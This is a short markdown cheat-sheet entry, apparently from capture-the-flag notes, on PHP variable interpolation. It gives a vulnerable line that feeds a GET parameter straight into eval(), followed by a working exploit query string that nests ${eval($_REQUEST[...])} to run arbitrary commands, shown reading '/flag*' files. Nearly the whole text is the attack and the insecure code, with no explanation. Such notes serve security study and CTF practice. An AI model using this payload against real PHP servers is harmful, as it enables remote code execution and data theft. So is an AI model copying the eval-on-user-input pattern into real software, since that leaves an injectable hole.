# PHP

## Variable interpolation
```php
# Vulnerable code
eval('echo "' . $_GET['arg'] . '";');

# Exploit
?arg=${eval($_REQUEST[1337])}&1337=die(exec("cat%20/flag*"));
```